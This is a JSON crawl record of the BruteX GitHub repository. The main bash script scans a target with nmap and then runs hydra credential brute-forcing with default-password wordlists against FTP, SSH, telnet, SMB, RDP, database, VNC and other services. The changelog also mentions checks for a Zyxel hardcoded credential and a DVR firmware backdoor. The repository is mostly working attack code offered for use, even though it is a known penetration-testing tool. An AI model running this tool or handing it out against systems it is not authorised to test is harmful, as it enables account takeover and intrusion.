{
  "metadata": {
    "timestamp": 1736568423531,
    "page": 378,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjM3OQ==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "1N3/BruteX",
      "stars": 2004,
      "defaultBranch": "master",
      "files": [
        {
          "name": "BruteX-logo.jpg",
          "type": "blob",
          "size": 21.6953125,
          "content": null
        },
        {
          "name": "CHANGELOG.md",
          "type": "blob",
          "size": 1.728515625,
          "content": "## CHANGELOG:\n* v2.5 Updated Docker image to Kali Linux\n* v2.5 Updated SSH threads to avoid saturation with too many requests\n* v2.4 Disabled web brute force ports (80/443) to prevent F+ results\n* v2.3 Updated default credentials for Rasberry Pi/Kali\n* v2.2 Added CVE-2020-29583 Zyxel SSH Hardcoded Credentials\n* v2.1 Added Kali XFCE4 start menu application\n* v2.1 Added 0day vulnerability (backdoor) in firmware for HiSilicon-based DVRs, NVRs and IP cameras\n* v2.0 Fixed issue with VNC port\n* v1.9 Updated default credential lists for each service\n* v1.8 Added improved default credential list for each service\n* v1.7 Removed DNS brute forcing\n* v1.7 Added -P0 to NMap scan options\n* v1.6 Removed HTTP/HTTPS basic auth checks to normal scans. Use brutex <IP> port <80/443> to scan with that option... \n* v1.5b Fixed issue with dirb\n* v1.5a Removed clear command\n* v1.5 Added install.sh\n* v1.5 Fixed SNMP brute force options\n* v1.5 Fixed http/https brute force options\n* v1.4 Removed dirb web directory brute forcing\n* v1.3d Added Fortinet user/pass \n* v1.3d Added DirBuster for web brute forcing\n* v1.3c Fixed error with DNS namelist.txt\n* v1.3b Fixed brutex global DIR issue\n* v1.3a Fixed HTTP proxy brute force options\n* v1.3 added faster scan options for nmap\n* v1.3 revised password brute force lists for more efficient service brute forcing\n* v1.3 added wordlist directory with new wordlist selections\n* v1.2 adds dnsenum / removes DNSDict6 as no longer supported on Kali 2.0\n* v1.2 removed wfuzz web file brute forcing as it was too error prone and noisy\n* v1.2 adds the ability to specify a port to target (ie. 23 for telnet) to automatically brute force\n* v1.2 added additional ports to scan and brute force\n* v1.2 added additional default users to brute force\n"
        },
        {
          "name": "Dockerfile",
          "type": "blob",
          "size": 1.0146484375,
          "content": "FROM kalilinux/kali-rolling\n\nLABEL org.label-schema.name='BruteX - Kali Linux' \\\n    org.label-schema.description='Automatically brute force all services running on a target. ' \\\n    org.label-schema.usage='https://github.com/1N3/BruteX' \\\n    org.label-schema.url='https://github.com/1N3/BruteX' \\\n    org.label-schema.vendor='https://sn1persecurity.com' \\\n    org.label-schema.schema-version='1.0' \\\n    org.label-schema.docker.cmd.devel='docker run --rm -ti xer0dayz/brutex' \\\n    MAINTAINER=\"@xer0dayz\"\n\nRUN echo \"deb http://http.kali.org/kali kali-rolling main contrib non-free\" > /etc/apt/sources.list && \\\n    echo \"deb-src http://http.kali.org/kali kali-rolling main contrib non-free\" >> /etc/apt/sources.list\n\nENV DEBIAN_FRONTEND noninteractive\n\nRUN set -x \\\n        && apt-get -yqq update \\\n        && apt-get -yqq dist-upgrade \\\n        && apt-get clean\n\nRUN apt-get --yes install git \\\n    && cd /tmp \\\n    && git clone https://github.com/1N3/BruteX.git \\\n    && cd BruteX \\\n    && ./install.sh \\\n    && brutex\n\nCMD [\"brutex\"]\n"
        },
        {
          "name": "README.md",
          "type": "blob",
          "size": 1.1484375,
          "content": "[![Build Status](https://img.shields.io/github/forks/1N3/BruteX.svg)](https://github.com/1N3/BruteX)\n[![Build Status](https://img.shields.io/github/stars/1N3/BruteX.svg)](https://github.com/1N3/BruteX)\n[![Rawsec's CyberSecurity Inventory](https://inventory.raw.pm/img/badges/Rawsec-inventoried-FF5050_flat.svg)](https://inventory.raw.pm/tools.html#BruteX)\n\n# BruteX\n![alt tag](https://github.com/1N3/BruteX/blob/master/BruteX-logo.jpg)\n\n## ABOUT:\nAutomatically brute force all services running on a target\n\n* Open ports\n* Usernames\n* Passwords\n\n## INSTALL:\n```\n./install.sh\n```\n\n## USAGE:\n```\nbrutex target <port>\n```\n\n## DOCKER:\n```\ndocker build -t brutex .\ndocker run -it brutex target <port>\n```\n\n## LICENSE:\nYou may modify and re-distribute this software as long as the project name \"BruteX\", credit to the author \"xer0dayz\" and website URL \"https://sn1persecurity.com\" are NOT mofified. Doing so will break the license agreement and a takedown notice will be issued. \n\n## LINKS:\n- [Twitter](https://www.twitter.com/xer0dayz \"Personal Twitter\")\n- [Twitter](https://www.twitter.com/sn1persecurity \"Company Twitter\")\n- [Website](https://sn1persecurity.com \"Sn1perSecurity\")\n"
        },
        {
          "name": "brutex",
          "type": "blob",
          "size": 12.39453125,
          "content": "#!/bin/bash \n# BruteX by @xer0dayz\n# http://sn1persecurity.com\n#\n# ABOUT:\n# BruteX is a simple bash script used to brute force all services on a target.\n#\n# INSTALL:\n# ./install.sh\n#\n# USAGE:\n# brutex <IP/hostname> <port>\n#\n# HYDRA SERVICES: \n# asterisk cisco cisco-enable cvs ftp ftps http[s]-{head|get} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql(v4) nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp redis rexec rlogin rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey teamspeak telnet[s] vmauthd vnc xmpp\n\nTARGET=\"$1\"\nPORT=\"$2\"\nVER=\"2.5\"\nLOOT_DIR=/usr/share/brutex/loot\nFTP_USER_PASS=\"/usr/share/brutex/wordlists/ftp-default-userpass.txt\"\nFTP_USERS=\"/usr/share/brutex/wordlists/ftp_defuser.lst\"\nFTP_PASS=\"/usr/share/brutex/wordlists/ftp_defpass.lst\"\nSSH_USER_PASS=\"/usr/share/brutex/wordlists/ssh-default-userpass.txt\"\nSSH_USERS=\"/usr/share/brutex/wordlists/ssh_defuser.lst\"\nSSH_PASS=\"/usr/share/brutex/wordlists/ssh_defpass.lst\"\nSMTP_USERS=\"/usr/share/brutex/wordlists/smtp_defuser.lst\"\nSMTP_PASS=\"/usr/share/brutex/wordlists/smtp_defpass.lst\"\nPOP_USERS=\"/usr/share/brutex/wordlists/pop_defuser.lst\"\nPOP_PASS=\"/usr/share/brutex/wordlists/pop_defpass.lst\"\nTELNET_USER_PASS=\"/usr/share/brutex/wordlists/telnet-default-userpass.txt\"\nTELNET_USERS=\"/usr/share/brutex/wordlists/telnet_defuser.lst\"\nTELNET_PASS=\"/usr/share/brutex/wordlists/telnet_defpass.lst\"\nSQL_USERS=\"/usr/share/brutex/wordlists/sql_defuser.lst\"\nSQL_PASS=\"/usr/share/brutex/wordlists/sql_defpass.lst\"\nMSSQL_USER_PASS=\"/usr/share/brutex/wordlists/mssql-default-userpass.txt\"\nMYSQL_USER_PASS=\"/usr/share/brutex/wordlists/mysql-default-userpass.txt\"\nORACLE_USER_PASS=\"/usr/share/brutex/wordlists/oracle-default-userpass.txt\"\nPOSTGRES_USER_PASS=\"/usr/share/brutex/wordlists/postgres-default-userpass.txt\"\nWINDOWS_USER_LIST=\"/usr/share/brutex/wordlists/windows-users.txt\"\nWINDOWS_USER_PASS=\"/usr/share/brutex/wordlists/windows-default-userpass.txt\"\nUSER_FILE=\"/usr/share/brutex/wordlists/simple-users.txt\"\nPASS_FILE=\"/usr/share/brutex/wordlists/password.lst\"\nSNMP_FILE=\"/usr/share/brutex/wordlists/snmp-strings.txt\"\nVNC_FILE=\"/usr/share/brutex/wordlists/vnc-default-passwords.txt\"\nHTTP_LOCATION=\"/\"\nTHREADS=\"10\"\nCOLOR1='\\033[91m'\nCOLOR2='\\033[92m'\nCOLOR3='\\033[92m'\nRESET='\\e[0m'\n\n# UN-COMMENT TO ENABLE PROXY\n#export HYDRA_PROXY=socks4://127.0.0.1:9050\n\nif [ -z $TARGET ]; then\n\techo -e \"$COLOR1 __________                __         ____  ___$RESET\"\n\techo -e \"$COLOR1 \\______   \\_______ __ ___/  |_  ____ \\   \\/  /$RESET\"\n\techo -e \"$COLOR1  |    |  _/\\_  __ \\  |  \\   __\\/ __ \\ \\     / $RESET\"\n\techo -e \"$COLOR1  |    |   \\ |  | \\/  |  /|  | \\  ___/ /     \\ $RESET\"\n\techo -e \"$COLOR1  |______  / |__|  |____/ |__|  \\___  >___/\\  \\ $RESET\"\n\techo -e \"$COLOR1         \\/                         \\/      \\_/$RESET\"\n\techo \"\"\n\techo -e \"$COLOR1 + -- --=[ BruteX v$VER by @xer0dayz$RESET\"\n\techo -e \"$COLOR1 + -- --=[ https://sn1persecurity.com$RESET\"\n\techo -e \"$COLOR1 + -- --=[ Usage: brutex <target> <port>\"\n\techo -e \"$RESET\"\n\texit\nfi\n\nDIR=$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" && pwd )\n\necho -e \"$COLOR1 __________                __         ____  ___$RESET\"\necho -e \"$COLOR1 \\______   \\_______ __ ___/  |_  ____ \\   \\/  /$RESET\"\necho -e \"$COLOR1  |    |  _/\\_  __ \\  |  \\   __\\/ __ \\ \\     / $RESET\"\necho -e \"$COLOR1  |    |   \\ |  | \\/  |  /|  | \\  ___/ /     \\ $RESET\"\necho -e \"$COLOR1  |______  / |__|  |____/ |__|  \\___  >___/\\  \\ $RESET\"\necho -e \"$COLOR1         \\/                         \\/      \\_/$RESET\"\necho \"\"\necho -e \"$COLOR1 + -- --=[ BruteX v$VER by @xer0dayz$RESET\"\necho -e \"$COLOR1 + -- --=[ http://sn1persecurity.com$RESET\"\necho \"\"\necho \"\"\n\necho -e \"$COLOR3################################### Running Port Scan ##############################$RESET\"\nif [ -z \"$PORT\" ] \nthen\n\tnmap -T4 -P0 --open $TARGET -p21,22,23,25,53,110,139,162,389,445,512,513,514,993,1433,1521,3306,3389,5432,5900,5901,8000,8080,6667 -oX $LOOT_DIR/nmap-$TARGET.xml\nelse\n\tnmap -T4 -P0 --open $TARGET -p $PORT -oX $LOOT_DIR/nmap-$TARGET.xml\nfi\necho \"\"\necho -e \"$COLOR3################################### Running Brute Force ############################$RESET\"\necho \"\"\nport_21=`grep 'portid=\"21\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_22=`grep 'portid=\"22\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_23=`grep 'portid=\"23\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_25=`grep 'portid=\"25\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_80=`grep 'portid=\"80\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_110=`grep 'portid=\"110\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_139=`grep 'portid=\"139\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_162=`grep 'portid=\"162\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_389=`grep 'portid=\"389\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_443=`grep 'portid=\"443\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_445=`grep 'portid=\"445\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_512=`grep 'portid=\"512\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_513=`grep 'portid=\"513\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_512=`grep 'portid=\"514\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_993=`grep 'portid=\"993\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_1433=`grep 'portid=\"1433\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_1521=`grep 'portid=\"1521\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_3306=`grep 'portid=\"3306\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_3389=`grep 'portid=\"3389\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_5432=`grep 'portid=\"5432\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_5900=`grep 'portid=\"5900\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_5901=`grep 'portid=\"5901\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_6667=`grep 'portid=\"6667\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_8000=`grep 'portid=\"8000\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\nport_8080=`grep 'portid=\"8080\"' $LOOT_DIR/nmap-$TARGET.xml | grep open`\n\nif [ -z \"$port_21\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 21 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 21 opened... running tests...$RESET\"\t\n\thydra -C $FTP_USER_PASS $TARGET ftp -t $THREADS\n\thydra -L $FTP_USERS -P $FTP_PASS $TARGET ftp -t $THREADS\nfi\n\nif [ -z \"$port_22\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 22 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 22 opened... running tests...$RESET\"\n\thydra -C $SSH_USER_PASS $TARGET ssh -t 4\n\t#hydra -L $USER_FILE -P $PASS_FILE $TARGET ssh -t $THREADS\n\t#hydra -L $SSH_USERS -P $SSH_PASS $TARGET ssh -t $THREADS\nfi\n\nif [ -z \"$port_23\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 23 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 23 opened... running tests...$RESET\"\n\thydra -C $TELNET_USER_PASS $TARGET telnet -t $THREADS\n\thydra -L $USER_FILE -P $PASS_FILE $TARGET telnet -t $THREADS\n\thydra -L $TELNET_USERS -P $TELNET_PASS $TARGET telnet -t $THREADS\nfi\n\nif [ -z \"$port_25\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 25 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 25 opened... running tests...$RESET\"\n\thydra -L $USER_FILE -P $PASS_FILE $TARGET smtp-enum -t $THREADS\n\thydra -L $USER_FILE -P $PASS_FILE $TARGET smtp -t $THREADS\n\thydra -L $SMTP_USERS -P $SMTP_PASS $TARGET smtp -t $THREADS\nfi\n\nif [ -z \"$port_110\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 110 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 110 opened... running tests...$RESET\"\n\thydra -L $USER_FILE -P $PASS_FILE $TARGET pop3 -t $THREADS\n\thydra -L $POP_USERS -P $POP_PASS $TARGET pop3 -t $THREADS\nfi\n\nif [ -z \"$port_139\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 139 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 139 opened... running tests...$RESET\"\n\thydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET smb -S 139 -t $THREADS\nfi\n\nif [ -z \"$port_162\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 162 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 162 opened... running tests...$RESET\"\n\thydra -P $SNMP_FILE snmp -S 162 -t $THREADS\nfi\n\nif [ -z \"$port_389\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 389 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 389 opened... running tests...$RESET\"\n\thydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET ldap2 -S 389 -t $THREADS\n\thydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET ldap3 -S 389 -t $THREADS\nfi\n\nif [ -z \"$port_445\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 445 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 445 opened... running tests...$RESET\"\n\thydra -C $WINDOWS_USER_PASS $TARGET smb -S 445 -t $THREADS\n\thydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET smb -S 445 -t $THREADS\nfi\n\nif [ -z \"$port_512\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 512 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 512 opened... running tests...$RESET\"\n\thydra -L $USER_FILE -P $PASS_FILE $TARGET rexec -S 512 -t $THREADS\nfi\n\nif [ -z \"$port_513\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 513 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 513 opened... running tests...$RESET\"\n\thydra -L $USER_FILE -P $PASS_FILE $TARGET rlogin -S 513 -t $THREADS\nfi\n\nif [ -z \"$port_514\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 514 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 514 opened... running tests...$RESET\"\n\thydra -L $USER_FILE -P $PASS_FILE $TARGET rsh -S 514 -t $THREADS\nfi\n\nif [ -z \"$port_993\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 993 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 993 opened... running tests...$RESET\"\n\thydra -L $USER_FILE -P $PASS_FILE $TARGET imap -S 993 -t $THREADS\nfi\n\nif [ -z \"$port_1433\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 1433 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 1433 opened... running tests...$RESET\"\n\thydra -C $MSSQL_USER_PASS $TARGET mssql -S 1433 -t $THREADS\n\thydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET mssql -S 1433 -t $THREADS\nfi\n\nif [ -z \"$port_1521\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 1521 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 1521 opened... running tests...$RESET\"\n\thydra -C $ORACLE_USER_PASS $TARGET oracle -S 1521 -t $THREADS\nfi\n\nif [ -z \"$port_3306\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 3306 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 3306 opened... running tests...$RESET\"\n\thydra -C $MYSQL_USER_PASS $TARGET mysql -t $THREADS\n\thydra -L $SQL_USERS -P $SQL_PASS $TARGET mysql -t $THREADS\nfi\n\nif [ -z \"$port_3389\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 3389 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 3389 opened... running tests...$RESET\"\n\thydra -C $WINDOWS_USER_PASS $TARGET rdp -t $THREADS\n\thydra -L $WINDOWS_USER_LIST -P $PASS_FILE $TARGET rdp -t $THREADS\nfi\n\nif [ -z \"$port_5432\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 5432 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 5432 opened... running tests...$RESET\"\n\thydra -C $POSTGRES_USER_PASS $TARGET postgres -t $THREADS\nfi\n\nif [ -z \"$port_5900\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 5900 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 5900 opened... running tests...$RESET\"\n\thydra -P $VNC_FILE $TARGET vnc -S 5900 -t $THREADS\n\thydra -P $PASS_FILE $TARGET vnc -S 5900 -t $THREADS\nfi\n\nif [ -z \"$port_5901\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 5901 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 5901 opened... running tests...$RESET\"\n\thydra -P $VNC_FILE $TARGET vnc -S 5901 -t $THREADS\n\thydra -P $PASS_FILE $TARGET vnc -S 5901 -t $THREADS\nfi\n\nif [ -z \"$port_6667\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 6667 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 6667 opened... running tests...$RESET\"\n\thydra -L $USER_FILE -P $PASS_FILE $TARGET irc -s 6667 -t $THREADS\nfi\n\nif [ -z \"$port_8000\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 8000 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 8000 opened... running tests...$RESET\"\n\thydra -L $USER_FILE -P $PASS_FILE $TARGET http-head -s 8000 -f -q -t $THREADS -m /\nfi\n\nif [ -z \"$port_8080\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 8080 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 8080 opened... running tests...$RESET\"\n\thydra -L $USER_FILE -P $PASS_FILE $TARGET http-head -S 8080 -f -q -t $THREADS -m /\nfi\n\nif [ -z \"$port_8100\" ]\nthen\n\techo -e \"$COLOR1 + -- --=[ Port 8100 closed... skipping.$RESET\"\nelse\n\techo -e \"$COLOR2 + -- --=[ Port 8100 opened... running tests...$RESET\"\n\thydra -L $USER_FILE -P $PASS_FILE $TARGET http-head -S 8100 -f -q -t $THREADS -m /\nfi\n\necho \"\"\necho -e \"$COLOR3################################### Done! ###########################################$RESET\"\nexit 0\n"
        },
        {
          "name": "brutex.desktop",
          "type": "blob",
          "size": 0.2314453125,
          "content": "[Desktop Entry]\nName=brutex\nEncoding=UTF-8\nExec=/usr/share/kali-menu/exec-in-shell \"sudo brutex\"\nIcon=avatar-default\nStartupNotify=false\nTerminal=true\nType=Application\nCategories=05-password-attacks;\nX-Kali-Package=brutex\nComment=\nPath=\n"
        },
        {
          "name": "install.sh",
          "type": "blob",
          "size": 1.39453125,
          "content": "#!/bin/bash\n# Install script for BruteX\n#\n# VARS\nCOLOR1='\\033[91m'\nCOLOR2='\\033[92m'\nCOLOR3='\\033[92m'\nOKBLUE='\\033[94m'\nRESET='\\e[0m'\n\necho -e \"$COLOR1 __________                __         ____  ___$RESET\"\necho -e \"$COLOR1 \\______   \\_______ __ ___/  |_  ____ \\   \\/  /$RESET\"\necho -e \"$COLOR1  |    |  _/\\_  __ \\  |  \\   __\\/ __ \\ \\     / $RESET\"\necho -e \"$COLOR1  |    |   \\ |  | \\/  |  /|  | \\  ___/ /     \\ $RESET\"\necho -e \"$COLOR1  |______  / |__|  |____/ |__|  \\___  >___/\\  \\ $RESET\"\necho -e \"$COLOR1         \\/                         \\/      \\_/$RESET\"\necho \"\"\necho -e \"$COLOR1 + -- --=[ BruteX by @xer0dayz$RESET\"\necho -e \"$COLOR1 + -- --=[ https://sn1persecurity.com$RESET\"\necho -e \"$RESET\"\n\nBRUTEX_INSTALL_DIR=/usr/share/brutex\n\necho -e \"$OKBLUE[*]$RESET Installing brutex under $BRUTEX_INSTALL_DIR...\"\nmkdir -p $BRUTEX_INSTALL_DIR 2> /dev/null\ncp -Rf $PWD/* $BRUTEX_INSTALL_DIR \ncd $BRUTEX_INSTALL_DIR\napt-get update\napt-get install -y nmap hydra dnsenum\nmkdir loot 2> /dev/null\nchmod +x $BRUTEX_INSTALL_DIR/brutex\nrm -f /usr/bin/brutex 2> /dev/null\nln -s /usr/share/brutex/brutex /usr/bin/brutex\ncp -f $BRUTEX_INSTALL_DIR/brutex.desktop /usr/share/applications/ 2> /dev/null\ncp -f $BRUTEX_INSTALL_DIR/brutex.desktop /usr/share/applications/brutex.desktop 2> /dev/null\ncp -f $BRUTEX_INSTALL_DIR/brutex.desktop /usr/share/kali-menu/applications/brutex.desktop 2> /dev/null\necho -e \"$OKBLUE[*]$RESET Done! $RESET\"\n\n\n"
        },
        {
          "name": "loot",
          "type": "tree",
          "content": null
        },
        {
          "name": "wordlists",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}